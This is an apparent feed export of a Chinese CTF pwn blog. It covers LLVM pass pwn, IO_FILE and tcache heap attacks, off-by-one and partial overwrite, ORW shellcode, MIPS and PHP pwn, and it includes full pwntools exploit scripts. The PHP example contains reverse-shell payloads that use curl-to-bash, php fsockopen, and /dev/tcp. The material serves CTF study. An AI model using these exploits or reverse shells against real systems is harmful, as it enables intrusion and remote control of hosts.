main，找到一个差不多的断点，c直接跑到这个地方，然后vmmap查看是否加载进来，这样就可以打断点调试了 还有个catch load方法，然后可以一直finish，直到返回opt的main函数中 opt执行执行重写的runOnFunction函数 可以根据ida中opt的内容设置断点 llvm::legacy::PassManager::run llvm pass Pass就是遍历一遍IR，同时对它做一些操作。LLVM的核心库中会给你一些pass类去继承，我们需要实现它的一些方法，最后使用 LLVM的编译器会把它翻译得到的 IR传入 Pass里，给你遍历和修改。
LLVM Pass的作用：
进行插装，在 pass遍历LLVM IR的同时，自然就可以往里面插入新的代码 机器无关的代码优化：IR在被翻译成机器码前会做一些机器无关的优化，但是不同的优化方法之间需要解耦，所以自然要各自遍历一遍IR，实现成了一个个LLVM Pass，最终，基于 LLVM的编译器会在前端生成 LLVM IR后调用一些LLVM Pass做机器无关优化，然后再调用LLVM后端生成目标平台代码</content></entry><entry><title>llvm基础学习</title><url>/post/llvm-pwn/llvm%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url><categories><category>PWN</category><category>LLVM Pwn</category></categories><tags><tag>llvm pwn</tag></tags><content type="html"><![CDATA[   参考博客1 参考博客2 基础知识 前端后端都不用管，关注llvm IR这个东西 llvm IR的头部是一些Target Information target layout clang 与 llvm 常见指令 .ll 格式：人类可以阅读的文本 .bc 格式：适合机器存储的二进制文件 .c -&gt; .ll：clang -emit-llvm -S a.c -o a.ll .c -&gt; .bc: clang -emit-llvm -c a.c -o a.bc .ll -&gt; .bc: llvm-as a.ll -o a.bc .bc -&gt; .ll: llvm-dis a.bc -o a.ll opt opt是LLVM的优化器和分析器，可加载指定的模块，对输入的LLVM IR或者LLVM字节码进行优化或分析。CTF题目一般会给出所需版本的opt文件（可用./opt &ndash;version查看版本）或者在README文档中告知opt版本。安装好llvm后，可在/usr/lib/llvm-xx/bin/opt路径下找到对应llvm版本的opt文件（一般不开PIE保护）。 需要注意的是，最好使用题目所给opt同版本的clang生成ll或bc文件。如：题目所给的文件是opt-8，就最好使用clang-8 -emit-llvm -S exp.c -o exp.ll命令。 LLVM PASS类题目都会给出一个xxx.so，即自定义的LLVM PASS模块，漏洞点就自然会出现在其中。我们可以使用opt -load ./xxx.so -xxx ./exp.{ll/bc}命令加载模块并启动LLVM的优化分析（其中-xxx是xxx.so中注册的PASS的名称，README文档中一般会给出，也可以通过逆向PASS模块得到）。需要注意的是，若题目给了opt文件，就用题目指定的opt文件启动LLVM并调试（如命令./opt-8 &hellip;），直接使用opt-8 &hellip;命令是用的系统安装的opt，可能会和题目所给的有不同。 在打远程的时候，与内核和QEMU逃逸的题类似：将exp.ll或exp.bc通过base64加密传输到远程服务器，远程服务器会解码，并将得到的LLVM IR传给LLVM运行。   ]]></content></entry><entry><title>magic gadgets</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BBio_file/magic-gadgets/</url><categories><category>PWN</category><category>堆攻击IO_FILE</category></categories><tags><tag>堆-magic gadgets</tag></tags><content type="html"><![CDATA[  libc2.36 此时的rax正好指向FAKE_IO头部 .text:0000000000160E56 mov rdx, [rax+38h] .text:0000000000160E5A mov rdi, rax .text:0000000000160E5D call qword ptr [rdx+20h] 也就是svcudp_reply+0x1a .text:00000000001630AA mov rbp, [rdi+48h] .text:00000000001630AE mov rax, [rbp+18h] .text:00000000001630B2 lea r13, [rbp+10h] .text:00000000001630B6 mov dword ptr [rbp+10h], 0 .text:00000000001630BD mov rdi, r13 .text:00000000001630C0 call qword ptr [rax+28h] ROPgadget --binary libc.so.6 | grep &#39;mov rdi, r13&#39; 0x00000000001587b3 : mov rdi, r13 ; call qword ptr [rax + 0x10] 0x000000000008975f : mov rdi, r13 ; call qword ptr [rax + 0x18] 0x000000000015760c : mov rdi, r13 ; call qword ptr [rax + 0x20] 0x00000000001630bd : mov rdi, r13 ; call qword ptr [rax + 0x28] libc2.35(house of apple2) 参考博客 libc2.35 3.6 0x16A06A libc2.35 3_ 在上述偏移上下找就行 gadget=licbase+0x16A1FA magic_gadget = libc_base + libc.sym[&ldquo;svcudp_reply&rdquo;] + 0x1a
0x7ffff7f092ba &lt;svcudp_reply+26&gt; mov rbp, qword ptr [rdi + 0x48] 0x7ffff7f092be &lt;svcudp_reply+30&gt; mov rax, qword ptr [rbp + 0x18] 0x7ffff7f092c2 &lt;svcudp_reply+34&gt; lea r13, [rbp + 0x10] 0x7ffff7f092c6 &lt;svcudp_reply+38&gt; mov dword ptr [rbp + 0x10], 0 0x7ffff7f092cd &lt;svcudp_reply+45&gt; mov rdi, r13 0x7ffff7f092d0 &lt;svcudp_reply+48&gt; call qword ptr [rax + 0x28] 具体做法 fake_IO_addr = magic_gadget = libc_base + libc.sym[&#34;svcudp_reply&#34;] + 0x1a leave_ret = libc_base + 0x0000000000052d72 #: leave ; ret pop_rdi_ret = libc_base + 0x000000000002daa2 #: pop rdi ; ret pop_rsi_ret = libc_base + 0x0000000000037c0a #: pop rsi ; ret pop_rdx_r12_ret = libc_base + 0x00000000001066e1 #: pop rdx ; pop r12 ; ret rop_address = fake_IO_addr + 0xe0 + 0xe8 + 0x70 #read(0, (void *)ptr[num], 0xAA0uLL)直接向_IO_2_1_stderr_写入数据，同时伪造A,B,C三个fake file orw_rop = b&#39;./flag\x00\x00&#39; orw_rop += p64(pop_rdx_r12_ret) + p64(0) + p64(fake_IO_addr - 0x10) orw_rop += p64(pop_rdi_ret) + p64(rop_address) orw_rop += p64(pop_rsi_ret) + p64(0) orw_rop += p64(libc_base + libc.sym[&#39;open&#39;]) orw_rop += p64(pop_rdi_ret) + p64(3) orw_rop += p64(pop_rsi_ret) + p64(rop_address + 0x100) orw_rop += p64(pop_rdx_r12_ret) + p64(0x50) + p64(0) orw_rop += p64(libc_base + libc.sym[&#39;read&#39;]) orw_rop += p64(pop_rdi_ret) + p64(1) orw_rop += p64(pop_rsi_ret) + p64(rop_address + 0x100) orw_rop += p64(pop_rdx_r12_ret) + p64(0x50) + p64(0) orw_rop += p64(libc_base + libc.sym[&#39;write&#39;]) payload = p64(0) + p64(leave_ret) + p64(1) + p64(2) #这样设置同时满足assert和fsop payload = payload.ljust(0x38, b&#39;\x00&#39;) + p64(rop_address) #FAKE FILE+0x48 payload = payload.ljust(0x90, b&#39;\x00&#39;) + p64(fake_IO_addr + 0xe0) #_wide_data=fake_IO_addr + 0xe0 payload = payload.ljust(0xc8, b&#39;\x00&#39;) + p64(libc_base + libc.sym[&#39;_IO_wfile_jumps&#39;]) #vtable=_IO_wfile_jumps #*(A+0Xe0)=B _wide_data-&gt;_wide_vtable=fake_IO_addr + 0xe0 + 0xe8 payload = payload.ljust(0xd0 + 0xe0, b&#39;\x00&#39;) + p64(fake_IO_addr + 0xe0 + 0xe8) #*(B+0X68)=C=magic_gadget payload = payload.ljust(0xd0 + 0xe8 + 0x68, b&#39;\x00&#39;) + p64(magic_gadget) payload = payload + orw_rop 过程描述 rdi= A,rbp=rop_addr rax=A-0x10 call [rax+0x28]等价于call leave;ret leave：mov rsp,rbp; pop rbp 此时rsp=rop_addr再ret执行rop libc2.34(house of emma) libc2.34,在libc2.35就没了这个gadget gadget_addr = libc_base + 0x146020 各个libc相差一般也不会太远，就在附近找就行 可以设置rdx的值然后setcontent+61来进行orw
mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; libc2.31 libc2.31利用 getkeyserv_handle+576 mov rdx, [rdi+8] mov [rsp+0C8h+var_C8], rax call qword ptr [rdx+20h]   ]]></content></entry><entry><title>mips pwn基础知识</title><url>/post/mips-pwn/mips-pwn%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url><categories><category>PWN</category><category>Mips Pwn</category></categories><tags><tag>mips pwn</tag></tags><content type="html"><![CDATA[   经典例题讲解 wiki内容 运行mips文件以及调试 安装mipsrop插件 shellcode base mips没有NX功能，所以栈是可以执行的，所以基本上都是打shellcode 经典例题根据能否泄露栈地址分为两种 ida7.5才支持mips反汇编，安装mipsrop插件用不了报错一般是python文件中的代码哪里有些问题，网上搜索改一下就行了 如果对shellcode长度有要求，可以查看那个shellcode base mips寄存器 做题常用 要现在search中点击mips rop gadgets后，再到底下python行输入下列指令才行，这样路径才正确 常见mipsrop指令 mipsrop.find() mipsrop.stackfinders() mipsrop.find(&#34;move $t9,$a2&#34;) 本地运行 mips32位动态连接 qemu-mipsel -L /usr/mipsel-linux-gnu/ ./pwn gdb本地调试 qemu-mipsel -L /usr/mipsel-linux-gnu/ -g 1234 pwn gdb-multiarch pwn -q set architecture mips target remote localhost:1234 但是直接用pwntools的也能直接运行
p=gdb.debug(&#34;./mips&#34;,&#39;b *0x400860&#39;) 能调试了剩下的都很简单了   ]]></content></entry><entry><title>mips pwn例题</title><url>/post/mips-pwn/mips-pwn%E4%BE%8B%E9%A2%98/</url><categories><category>PWN</category><category>Mips Pwn</category></categories><tags><tag>mips pwn</tag></tags><content type="html"><![CDATA[   这里以XYCTF2024 EZ1.0? 为例题 题目分析 int vuln() { char v1[64]; // [sp+18h] [+18h] BYREF read(0, v1, 256); return 0; } 无法泄露栈地址，因此要找适当的gadget来把sp的值给某个寄存器，然后跳转到栈上相应位置执行shellcode
剩下的找gadget找完直接rop+shellcode就打完了 exp from pwn import * from pwnlib.util.packing import p32 context(arch=&#39;mips&#39;,endian=&#39;little&#39;,log_level=&#39;debug&#39;) # p = process([&#34;qemu-mipsel&#34;,&#34;-L&#34;,&#34;/usr/mipsel-linux-gnu/&#34;,&#34;./mips&#34;]) # p=gdb.debug(&#34;./mips&#34;,&#39;b *0x400860&#39;) p=remote(&#39;10.131.223.200&#39;,57935) def dbg(): gdb.attach(p,&#39;b *0x400860&#39;) # dbg() &#39;&#39;&#39; 0x00427968 | addiu $a2,$sp,0x68+var_10 | jalr $fp .text:00400740 lw $ra, 0x1C+var_s10($sp) 0x2c .text:00400744 lw $s3, 0x1C+var_sC($sp) .text:00400748 lw $s2, 0x1C+var_s8($sp) .text:0040074C lw $s1, 0x1C+var_s4($sp) 0x20 .text:00400750 lw $s0, 0x1C+var_s0($sp) .text:00400754 jr $ra .text:00400758 addiu $sp, 0x30 这里很怪不知道为什么发现addiu $sp, 0x30也执行了 0x0040B2A0 | addiu $a2,$sp,0x44+var_C 0x38 | jalr $s1 0x0041FBF4 | move $t9,$a2 | jr $a2 &#39;&#39;&#39; shellcode=&#39;&#39;&#39; slti $a2, $zero, -1 li $t7, 0x69622f2f sw $t7, -12($sp) li $t6, 0x68732f6e sw $t6, -8($sp) sw $zero, -4($sp) la $a0, -12($sp) slti $a1, $zero, -1 li $v0, 4011 syscall 0x40404 &#39;&#39;&#39; #从sp+0x18开始读 payload=b&#39;a&#39;*0x44+p32(0x00400740) #$ra 第一个 payload=payload.ljust(0x68,b&#39;a&#39;)+p32(0x0041FBF4) #s1 payload+=b&#39;a&#39;*0x8+p32(0x0040B2A0) #$ra 第二个 payload=payload.ljust(0xb0,b&#39;a&#39;)+asm(shellcode) payload=payload.ljust(0x100,b&#39;a&#39;) p.send(payload) p.interactive()   ]]></content></entry><entry><title>mp_</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BBtcache/mp_/</url><categories><category>PWN</category><category>堆攻击tcache</category></categories><tags><tag>mp_结构体</tag></tags><content type="html"><![CDATA[  [TOC]
不能使用tcache -&amp;gt; 通过large_bin attack修改mp_.tcache_bins -&amp;gt; free相应chunk -&amp;gt; 修改tcache的相应entries -&amp;gt; malloc 注意这里修改的是mp_.tcache_bins而不是mp_.tcache_max_bytes，修改这个值让tcache中的bin数变多，从而让largebin进入tcache 然后这个找偏移也不用纯手动算，直接telescope heapbase，然后看哪个是刚才被释放的chunk对应的count和位置 参考文章 核心代码 #泄露libcbase add(1,0x500) add(2,0x600) add(3,0x700) delete(1) #让1进入largebin delete(3) add(4,0x700) show(1) out=u64(p.recv(6).ljust(8,b&amp;#34;\x00&amp;#34;)) libcbase=out-libc.sym[&amp;#39;__malloc_hook&amp;#39;]-1168-0x10 free_hook= base +libc.sym[&amp;#39;__free_hook&amp;#39;] system=base+libc.sym[&amp;#39;system&amp;#39;] #泄露heapbase edit(1,b&amp;#39;a&amp;#39;*0x10) show(1) p.recvuntil(b&amp;#39;a&amp;#39;*0x10) heapbase=u64(p.recv(6).ljust(8,b&amp;#39;\x00&amp;#39;))-0x290 #recover edit(1,p64(out)*2) #largebin attack mp_offset=0x1e3280 mp_=libcbase+mp_offset #target为mp_.tcache_bins target=mp_+0x50 add(15,0x500)#take out 1 add(5,0x700)#chunk1 add(6,0x500) add(7,0x6f0)#chunk2 add(8,0x500) delete(5) add(9,0x900) show(5) fd=u64(p.recv(6).ljust(8,b&amp;#34;\x00&amp;#34;)) …  ]]></content></entry><entry><title>mprotect</title><url>/post/stackoverflow/mprotect/</url><categories><category>PWN</category><category>Stackoverflow</category></categories><tags><tag>stackoverflow</tag></tags><content type="html"> mprotect可以修改一个区域的权限
void mprotect(void *address, size_t length, int prot); address: 这是要操作的内存区域的起始地址。通常是一个 void 指针，可以指向任何类型的数据。 length: 这是要操作的内存区域的长度，以字节为单位。表示从起始地址开始，需要保护或更改的字节数。 prot: 这是指定内存区域的保护属性的参数。可以使用以下常量之一来指定保护属性： PROT_NONE、PROT_READ、PROT_WRITE 和 PROT_EXEC 常量分别对应的数字值是： PROT_NONE: 0 PROT_READ: 1 PROT_WRITE: 2 PROT_EXEC: 4 这些数字值可以通过按位或运算来组合，例如，如果要设置读、写、和执行权限，可以使用： 果要设置读、写、和执行权限，prot 的值将为 7 mprotect的地址要0x1000的倍数，要页对齐,length最好就是0x1000 mprotect(0x601000,0x1000,7)</content></entry><entry><title>off-by-one</title><url>/post/%E5%A0%86%E6%9D%82%E8%AE%B0/off-by-one/</url><categories><category>PWN</category><category>堆杂记</category></categories><tags><tag>off-by-one</tag></tags><content type="html"><![CDATA[   参考博客 off-by-one确实比off-by-null好打多了 注意off-by-one构造overlapping chunk的时候要使得通过size找到的chunk的prev_inuse=1 from pwn import * from pwnlib.util.packing import u64 from pwnlib.util.packing import p64 context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;) # p = process(&#34;/home/zp9080/PWN/vuln&#34;) p=remote(&#39;10.131.221.99&#39;,53721) elf = ELF(&#34;/home/zp9080/PWN/vuln&#34;) libc=elf.libc def dbg(): gdb.attach(p,&#39;b *￥rebase(0x181C)&#39;) pause() def add(idx,size): p.sendlineafter(&#34;&gt;&gt;&gt; &#34;,str(1)) p.sendlineafter(&#34;please input chunk_idx: &#34;,str(idx)) p.sendlineafter(&#34;Enter chunk size: &#34;,str(size)) def delete(idx): p.sendlineafter(&#34;&gt;&gt;&gt; &#34;,str(2)) p.sendlineafter(&#34;please input chunk_idx: &#34;,str(idx)) def show(idx): p.sendlineafter(&#34;&gt;&gt;&gt; &#34;,str(3)) p.sendlineafter(&#34;please input chunk_idx: &#34;,str(idx)) def edit(idx,content): p.sendlineafter(&#34;&gt;&gt;&gt; &#34;,str(4)) p.sendlineafter(&#34;please input chunk_idx: &#34;,str(idx)) p.send(content) for i in range(7): add(i,0xb0) for i in range(7): delete(i) # off-by-one to leak libc_base for i in range(6): add(i,0x28)#0-5 edit(0,&#39;a&#39;*0x28+&#39;\xc1&#39;) delete(1) add(1,0x28) #切割unsorted bin show(2) libcbase=u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))-0x1ecbe0 free_hook=libcbase+libc.sym[&#39;__free_hook&#39;] system_addr=libcbase+libc.sym[&#39;system&#39;] #打tcache poison delete(4) delete(3) add(6,0x70) edit(6,b&#39;a&#39;*0x20+p64(0)+p64(0x31)+p64(free_hook)) add(3,0x28) edit(3,b&#39;/bin/sh\x00&#39;) add(4,0x28) edit(4,p64(system_addr)) delete(3) p.interactive()   ]]></content></entry><entry><title>one_gadget</title><url>/post/stackoverflow/one_gadget/</url><categories><category>PWN</category><category>Stackoverflow</category></categories><tags><tag>stackoverflow</tag></tags><content type="html"> ogg</content></entry><entry><title>orw-plus</title><url>/post/shellcode/orw-plus/</url><categories><category>PWN</category><category>Shellcode</category></categories><tags><tag>orw-plus</tag></tags><content type="html"><![CDATA[   详细内容可以参考这篇文章 贴一个总结的还不错的文章 [TOC]
两种基本orw的shellcode 第一种
; open(&amp;#34;flag&amp;#34;, 0) push 0x67616c66 push 0x2 pop rax mov rdi,rsp xor rsi,rsi syscall ; read(fd, rsp, 0x50) mov rdi,rax xor rax,rax mov rsi,rsp push 0x50 pop rdx syscall ; write(1, rsp, 0x50) push 0x1 pop rax push 0x1 pop rdi mov rsi,rsp push 0x50 pop rdx syscall 第二种(第二种主要是用了sendfile系统调用) sendfile看这篇文章 /* call open(&amp;#39;rsp&amp;#39;, 0, &amp;#39;O_RDONLY&amp;#39;) */ push 0x67616c66 /* push b&amp;#39;flag\x00&amp;#39; */ push 2 pop rax mov rdi, rsp xor esi, esi cdq syscall /* call sendfile(1, &amp;#39;rax&amp;#39;, 0, 0x100) */ mov r10d, 0x100 mov rsi, rax push 40 /* sendfile的系统调用号0x28 */ pop rax push 1 pop rdi cdq syscall ORW缺R read（pread、readv、preadv、sendfile、mmap）
splice是和内核相关的了 可以考虑sendfile pread64、readv、preadv、preadv2系统调用 考虑mmap函数：最常见的用途之一是将文件映射到内存中。这允许进程直接从内存中读取或写入文件，而无需调用标准的 I/O 函数（如 read 和 write）。通过这种方式，可以更高效地访问文件，特别是对于大文件和随机访问 &amp;#39;&amp;#39;&amp;#39; /* open(&amp;#34;flag&amp;#34;,0)*/ mov rax,0x67616c662f2e push rax mov rdi, rsp xor edx, edx xor esi, esi mov …  ]]></content></entry><entry><title>partial overwrite</title><url>/post/%E5%A0%86%E6%9D%82%E8%AE%B0/partial-overwrite/</url><categories><category>PWN</category><category>堆杂记</category></categories><tags><tag>堆杂记-partial overwrite</tag></tags><content type="html"><![CDATA[  [TOC] 程序没有show函数，当堆块被free后，如果还可以edit，那么就可以通过partial overwrite来进行泄露进而爆破申请出想要申请的地址
这个也没什么原理，更多的算是一种trick vnctf2022 hideonheap 参考博客 house of corrision 题目分析很简单，没有show函数，但是free里面可以无限double free。 虽然edit有对sizelist进行检查，但是只要通过double free让两个指针指向同一个chunk就无限制edit 大多数人的解法 house of corrision,通过打malloc_assert可以打印即可 途中用了house of botcake,凑出一个chunk既在unsorted bin又在tcache中，这样就可以partial overwrite，进而申请出libc附近的地址 exp from pwn import * from pwnlib.util.packing import u64 from pwnlib.util.packing import u32 from pwnlib.util.packing import u16 from pwnlib.util.packing import u8 from pwnlib.util.packing import p64 from pwnlib.util.packing import p32 from pwnlib.util.packing import p16 from pwnlib.util.packing import p8 context.arch = &#39;amd64&#39; context.log_level = &#39;debug&#39; # s=remote(&#39;node5.buuoj.cn&#39;,25333) s = process(&#39;/home/zp9080/PWN/heap&#39;) libc = ELF(&#39;/home/zp9080/PWN/libc.so.6&#39;) def dbg(): gdb.attach(s,&#39;b *$rebase(0x11B2)&#39;) pause() def add(size): s.sendlineafter(b&#39;Choice:&#39; , b&#39;1&#39;) s.sendlineafter(b&#39;Size:&#39; , str(size).encode()) def edit(index,content): s.sendlineafter(b&#39;Choice:&#39; , b&#39;2&#39;) s.sendlineafter(b&#39;Index:&#39; , str(index).encode()) s.sendafter(b&#39;Content:&#39; , content) def delete(index): s.sendlineafter(b&#39;Choice:&#39; , b&#39;3&#39;) s.sendlineafter(b&#39;Index:&#39; , str(index).encode()) add(0x14b0) # 0 for i in range(7): add(0x50) # 1-7 for i in range(7): add(0x60) # 8-14 add(0x90) # 15 add(0x90) # 16 add(0x90) # 17 add(0x90) # 18 add(0x420) # 19 for i in range(1,8): delete(i) for i in range(8,15): delete(i) delete(15) add(0x90) # 1 = 15 ---------------------两个指针指向同一个chunk------------------------------- delete(16) add(0x90) # 2 = 16 delete(19) add(0x420) # 3 = 19 delete(19) add(0x410) # 4 #修改了top chunk的size,为了触发malloc_assert edit(3 , b&#39;\x00&#39;*0x410 + p64(0) + p64(0x233)) for i in range(7): delete(15) edit(1 , b&#39;a&#39;*0x10) #------------------------用house of botcake让一个chunk同时存在于tcache和unsorted bin中------------------------------ delete(15) add(0x10) # 5 edit(1 , b&#39;\x80\x3b&#39;) add(0x90) # 6 add(0x90) # 7 global_max_fast add(0x70) # 8 to clean unsorted bin #同样的手法 for i in range(2): delete(16) edit(2 , b&#39;\x00&#39;*0x10) delete(16) add(0x10) # 9 edit(2 , b&#39;\xc0\x15&#39;) add(0x90) # 10 add(0x90) # 11 _IO_2_1_stderr_ edit(7 , p64(0x666666)) #修改global_max_fast delete(0) #就是一开始那个很大的chunk dbg() edit(11 , p64(0xfbad1887) + p64(0)*3 + b&#39;\x00&#39;) #触发malloc_assert edit(7 , p64(0x80)) add(0x888) data=s.recvall(timeout=10) index = data.find(b&#39;d3ctf&#39;) print(hex(index)) print(data[index:0x30]) s.interactive()   ]]></content></entry><entry><title>personal skills</title><url>/post/%E5%A0%86/personal-skills/</url><categories><category>PWN</category><category>堆入门</category></categories><tags><tag>堆入门</tag></tags><content type="html"><![CDATA[   注意二级指针，*的作用是解引用，把它想成访问地址又形象又好理解 学会画图很重要 注意malloc的大小和实际开辟的chunk的大小 传给free的指针应当是指向mem的指针 tcache中next指针指向的是mem;fastbin的fd指针指向的是chunk header 一个指针值为多少它就指向哪里 各种bin,tcache都是有一个结构体指针数组，充当着链表头 区分&amp;p,p,*p 注意add,edit,show,delete函数的判断条件，这很重要，特别是delete有时候没有任何判断 基本上要打hook的情况下，最后都是要通过tcache构造:chunk-&gt;hook，再申请两次向hook里面写入东西 要有防止与top chunk合并的意识，每次多分配一个chunk防止与top chunk合并 当a是指针变量时，a-&gt;b等价为（&amp;a）.b 从 tcache bin 中申请堆块出来需要保证 counts &gt; 0，一般情况下打hook时tcache结构都是1-&gt;0变成1-&gt;hook，counts&gt;0是满足的，当特殊情况是需要留意counts &gt; 0 注意到底有没有uaf可以利用,下面这个看似置0了，但是注意是栈上的置0，不影响bss段中的notes 注意fastbin是0x20-0x80,留意打tcache时chunk大小是fastbin 一般没有uaf的时候，就必须有off-by-one，不然就无法泄露，除非partial overwrite申请出stdout largebin attack最好用之前申请过的，反正总有奇奇怪怪的问题 学会伪造fake chunk泄露libcbase这个技巧，想一想free的一些检查，很容易就得到了libcbase 当没有edit的时候一定会打chunk overlapping，只有得到一个大的overlapping chunk之后，将其free后再add就可以实现等同于edit的功能，这是一种很常见的技巧   ]]></content></entry><entry><title>php pwn基本知识</title><url>/post/php-pwn/php-pwn%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/</url><categories><category>PWN</category><category>Php Pwn</category></categories><tags><tag>php pwn</tag></tags><content type="html"><![CDATA[  [TOC]
基础知识 php pwn开启远程得到的实际上是远程用apache搭建的一个web页面，和web息息相关 我们上传文件后可以直接访问url/exp.php执行写的攻击脚本，进而得到flag 文件上传可用html，模板如下。要用phpstudy开启apache服务，然后用html进行文件上传 &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt; &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt; &amp;lt;title&amp;gt;POST数据包POC&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;form action=&amp;#34;http://192.168.76.128:8080/index.php&amp;#34; method=&amp;#34;post&amp;#34; enctype=&amp;#34;multipart/form-data&amp;#34;&amp;gt; &amp;lt;!--目标网址--&amp;gt; &amp;lt;label for=&amp;#34;file&amp;#34;&amp;gt;文件名：&amp;lt;/label&amp;gt; &amp;lt;input type=&amp;#34;file&amp;#34; name=&amp;#34;file&amp;#34; id=&amp;#34;file&amp;#34;&amp;gt;&amp;lt;br&amp;gt; &amp;lt;input type=&amp;#34;submit&amp;#34; name=&amp;#34;submit&amp;#34; value=&amp;#34;提交&amp;#34;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; php 内核探秘之 PHP_FUNCTION 宏 参考博客 从 最终变为 也就是做题时引用函数，是用zif_这个后面的，比如addHacker,removeHacker这些 php 堆知识 php中的string类型也是会用堆或者其他mmap的区域，但是不影响做题 php中的堆是没有header这个0x10字节的 参考博客 常用php自定义函数 //等价于p64 function …  ]]></content></entry><entry><title>php pwn例题</title><url>/post/php-pwn/%E4%BE%8B%E9%A2%98/</url><categories><category>PWN</category><category>Php Pwn</category></categories><tags><tag>php pwn</tag></tags><content type="html"><![CDATA[  2020De1CTF-mixture 参考博客 这个题的.so扩展函数的功能就是打开文件并且输出，memcpy没有限制n的大小有个很明显的栈溢出 主要思路是通过/proc/self/maps来泄露出libcbase，然后栈溢出反弹shell 但自己在想为什么不直接open(&lsquo;flag&rsquo;)??? exp1,通过python脚本交互，然后栈上rop from pwn import * import requests,re url = &#34;http://134.175.185.244&#34; libc = ELF(&#34;./libc.so&#34;) session = requests.Session() def login(): paramsPost = {&#34;password&#34;:&#34;goodlucktoyou&#34;,&#34;submit&#34;:&#34;submit&#34;,&#34;username&#34;:&#34;admin&#34;} session.post(url+&#34;/index.php&#34;, data=paramsPost) def send(payload): paramsPost = {&#34;submit&#34;:&#34;submit&#34;,&#34;search&#34;:payload} response = session.post(url+&#34;/select.php&#34;, data=paramsPost) return re.findall(&#39;\&lt;\/form\&gt;(.*?)\&lt;br\&gt;&#39;,response.content)[0] def read(payload): paramsPost = {&#34;submit&#34;:&#34;submit&#34;,&#34;search&#34;:payload} response = session.post(url+&#34;/select.php&#34;, data=paramsPost) return response.content[1517+len(payload):-1] login() # leak libc and stack libc.address = int(&#39;0x&#39;+re.findall(&#39;(.*?)libc-2.28&#39;,read(&#34;/proc/self/maps&#34;))[0][:12],16) stack = u64(send(&#39;a&#39;*0x64)[0x64:].ljust(8, b&#39;\0&#39;)) log.warn(&#34;stack: &#34;+str(hex(stack))) log.warn(&#34;libc: &#34;+str(hex(libc.address))) # gadget pop_rdi = libc.address + 0x023a5f pop4_ret = libc.address + 0x024568 def attack1(): payload = &#34;a&#34;*0x88 payload += p64(pop_rdi) + p64(stack+0xa0) + p64(libc.symbols[&#39;system&#39;]) payload += &#34;curl https://shell.now.sh/x.x.x.x:8888|bash\x00&#34; send(payload) def attack2(): payload = &#34;php -r &#39;$sock=fsockopen(\&#34;x.x.x.x\&#34;,8888);exec(\&#34;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&#34;);&#39;\x00&#34;.ljust(0x88) payload += p64(pop_rdi)*10+p64(pop4_ret)+p64(0)*4 payload += p64(pop_rdi)+p64(stack)+p64(libc.symbols[&#39;system&#39;]) send(payload) attack2() exp2 php写的攻击脚本，这个我更看的懂一些 &lt;?php $libc = &#34;&#34;; $stack = &#34;&#34;; //string to int function s2i($s) { $result = 0; for ($x = 0;$x &lt; strlen($s);$x++) { $result &lt;&lt;= 8; $result |= ord($s[$x]); } return $result; } //int to string function i2s($i, $x = 8) { $re = &#34;&#34;; for($j = 0;$j &lt; $x;$j++) { $re .= chr($i &amp; 0xff); $i &gt;&gt;= 8; } return $re; } function callback($buffer){ global $libc,$stack; $p1 = &#39;/([0-9a-f]+)\-[0-9a-f]+ .* \/lib\/x86_64-linux-gnu\/libc-2.27.so/&#39;; $p = &#39;/([0-9a-f]+)\-[0-9a-f]+ .* \[stack\]/&#39;; preg_match_all($p, $buffer, $stack); preg_match_all($p1, $buffer, $libc); return &#34;&#34;; } $command = &#39;/bin/bash -c &#34;/bin/bash -i &gt;&amp;/dev/tcp/127.0.0.1/6666 0&gt;&amp;1&#34;&#39;; //把Minclude输出的内容都存到buffer变量中 ob_start(); $a=&#34;/proc/self/maps&#34;; Minclude($a); $buffer=ob_get_contents(); ob_end_flush(); callback($buffer); $stack = hexdec($stack[1][0]); $libc_base = hexdec($libc[1][0]); //基本的栈溢出 $payload=str_repeat(&#34;a&#34;,0x88); $payload.=i2s($libc_base+0x215bf); $payload.=i2s($stack+0x1ca98+0x90).i2s($libc_base+0x23eea); $payload.=i2s($stack+0x1ca98+0x28).i2s($libc_base+0x80a10); $payload.=&#34;r&#34;.str_repeat(&#34;\x00&#34;,0x7).str_repeat(&#34;c&#34;,0x60); $payload.=$command.str_repeat(&#34;b&#34;,0x8); Minclude($payload) ?&gt; 2021-D^3CTF-hackphp php的堆一般给的.so文件都是Partial RELRO ,因此可以类似hijackgot打法   ]]></content></entry><entry><title>printf函数</title><url>/post/pwn%E7%AC%94%E8%AE%B0/printf%E5%87%BD%E6%95%B0/</url><categories><category>PWN</category><category>PWN笔记</category></categories><tags><tag>pwn</tag></tags><content type="html"> 奇怪的知识点，printf函数会有个判断al的值是否为0的操作来判断是否进行浮点数操作</content></entry><entry><title>protobuf</title><url>/post/go-pwn/protobuf/</url><categories><category>PWN</category><category>Go Pwn</category></categories><tags><tag>go pwn</tag></tags><content type="html"><![CDATA[   在go pwn的堆题中，经常会有结构体，在go中这些结构体就是通过protobuf来传递的 如果抹除了protobuf的标志，那就只能手撕了，具体可以看CISCN里面的几个例子，如果没有抹除标志，那就可以用 pbtk这个工具了 实际操作中发现要先让pwn文件的可以正常执行后，再用pbtk，感觉这个有点像seccomp-tools要跑pwn文件才能得到结果 $ sudo apt install python3-pip git openjdk-11-jre libqt5x11extras5 python3-pyqt5.qtwebengine python3-pyqt5 $ sudo pip3 install protobuf pyqt5 pyqtwebengine requests websocket-client $ git clone https://github.com/marin-m/pbtk $ cd pbtk $ ./gui.py #但一般是用下面这个 #脚本可以在没有 GUI 的情况下独立使用： #./extractors/from_binary.py [-h] input_file 